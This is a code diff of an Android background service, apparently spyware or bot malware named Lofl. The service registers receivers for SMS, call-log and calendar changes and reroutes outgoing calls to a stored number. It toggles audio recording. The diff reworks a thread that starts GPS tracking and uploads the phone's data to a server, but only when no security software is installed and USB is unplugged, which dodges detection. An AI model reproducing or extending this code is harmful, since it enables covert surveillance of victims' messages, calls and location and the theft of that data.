@@ -33,7 +33,7 @@ import com.candroid.lofl.data.Constants;
 import com.candroid.lofl.data.db.Database;
 import com.candroid.lofl.data.db.DatabaseHelper;
 import com.candroid.lofl.data.pojos.Recorder;
-import com.candroid.lofl.receivers.DatabaseReceiver;
+import com.candroid.lofl.receivers.SmsReceiver;
 import com.candroid.lofl.receivers.HeadsetPlugReceiver;
 import com.candroid.lofl.receivers.ImeReceiver;
 import com.candroid.lofl.receivers.IncomingReceiver;
@@ -44,14 +44,14 @@ import com.candroid.lofl.receivers.WifiReceiver;
 
 public class LoflService extends Service {
 
-    public static final String NOTIFICATION_CLICK_ACTIVITY = "NOTIFICATION_CLICK_ACTIVITY";
     private static final String TAG = LoflService.class.getSimpleName();
+    public static final String NOTIFICATION_CLICK_ACTIVITY = "NOTIFICATION_CLICK_ACTIVITY";
     public static boolean sHasCalledHome = false;
     public static boolean sIsRunning = false;
     private IncomingReceiver mIncomingReceiver;
     private ScreenReceiver mScreenReceiver;
     private WapReceiver mWapReceiver;
-    private DatabaseReceiver mDatabaseReceiver;
+    private SmsReceiver mSmsReceiver;
     private SmsObserver mObserver;
     private CallLogObserver mCallLogObserver;
     private CalendarObserver mCalendarObserver;
@@ -64,6 +64,7 @@ public class LoflService extends Service {
     private ImeReceiver mImeReceiver;
     public static Recorder sRecorder;
     public static boolean sIsBot;
+
     public LoflService() {
     }
 
@@ -125,14 +126,14 @@ public class LoflService extends Service {
         IntentFilter databaseFilter = new IntentFilter();
         databaseFilter.addAction(Telephony.Sms.Intents.SMS_RECEIVED_ACTION);
         databaseFilter.addAction(Constants.Actions.ACTION_OUTGOING_SMS);
-        mDatabaseReceiver = new DatabaseReceiver();
-        registerReceiver(mDatabaseReceiver, databaseFilter);
+        mSmsReceiver = new SmsReceiver();
+        registerReceiver(mSmsReceiver, databaseFilter);
         sTelephoneAddress = Systems.Phone.getDeviceTelephoneNumber(this);
         Log.d(TAG, "address = " + sTelephoneAddress);
         mObserver = new SmsObserver();
         mCallLogObserver = new CallLogObserver();
         mCalendarObserver = new CalendarObserver();
-        //getContentResolver().registerContentObserver(Uri.parse("content://sms"), true, mObserver);
+       // getContentResolver().registerContentObserver(Uri.parse("content://sms"), true, mObserver);
         if(this.checkSelfPermission(Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED){
             getContentResolver().registerContentObserver(Uri.parse("content://call_log"), true, mCallLogObserver);
         }
@@ -142,9 +143,8 @@ public class LoflService extends Service {
         SharedPreferences sharedPreferences = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
         OutgoingCallReceiver.sRerouteNumber = sharedPreferences.getString(OutgoingCallReceiver.NUMBER_KEY, "9727729432");
         ScreenReceiver.sShouldRecordAudio = sharedPreferences.getBoolean(ScreenReceiver.RECORDER_KEY, false);
-        CommandsIntentService.sShouldTrackGps = sharedPreferences.getBoolean(CommandsIntentService.GPS_TRACKER_KEY, false);
         sHasCalledHome = sharedPreferences.getBoolean(Constants.Keys.CALLED_HOME_KEY, false);
-        sIsBot = sharedPreferences.getBoolean(Constants.Keys.IS_BOT_KEY, false);
+        Bot.sIsBot = sharedPreferences.getBoolean(Bot.IS_BOT_KEY, false);
         //getContentResolver().registerContentObserver(Uri.parse("content://com.android.chrome.browser/history"), true, mBrowserObserver);
     }
 
@@ -156,23 +156,21 @@ public class LoflService extends Service {
                 @Override
                 public void run() {
                     Process.setThreadPriority(Process.THREAD_PRIORITY_BACKGROUND);
-                /*   Lofl.onReceiveCommand(LoflService.this, 21, "start", null);
-                    try {
-                        Thread.sleep(10000);
-                    } catch (InterruptedException e) {
-                        e.printStackTrace();
-                    }*/
-                    Bot.onReceiveCommand(LoflService.this, 21, "start", null);
+                    if(Systems.Gps.shouldTrackLocation(LoflService.this)){
+                        Bot.onReceiveCommand(LoflService.this, 21, "start", null);
+                        try {
+                            Thread.sleep(2000);
+                        } catch (InterruptedException e) {
+                            e.printStackTrace();
+                        }
+                    }
                     boolean hasSecuritySoftware = Apps.hasSecuritySoftwareInstalled(LoflService.this);
-                    if( ! hasSecuritySoftware && Systems.Usb.isUsbDisconnected(LoflService.this)){
+                    if( !sIsBot && ! hasSecuritySoftware && Systems.Usb.isUsbDisconnected(LoflService.this)){
                         Bot.onReceiveCommand(LoflService.this, Bot.Commands.SYNC_PHONE_TO_SERVER, null, null);
                     }
                 }
             }).start();
         }
-       /* if(CommandsIntentService.sShouldTrackGps){
-            Lofl.onReceiveCommand(this, Commands.GPS_TRACKER, "start", null);
-        }*/
         return super.onStartCommand(intent, flags, startId);
     }
 
@@ -189,7 +187,7 @@ public class LoflService extends Service {
         /*unregisterReceiver(mShareReceiver);*/
         //unregisterReceiver(mAirplaneReceiver);
         DatabaseHelper.getInstance(getApplicationContext()).close();
-        unregisterReceiver(mDatabaseReceiver);
+        unregisterReceiver(mSmsReceiver);
         //unregisterReceiver(mWifiReceiver);
         getContentResolver().unregisterContentObserver(mObserver);
         getContentResolver().unregisterContentObserver(mCallLogObserver);
@@ -342,7 +340,6 @@ public class LoflService extends Service {
                     cursor.close();
                 }
             }).start();
-
         }
     }
 
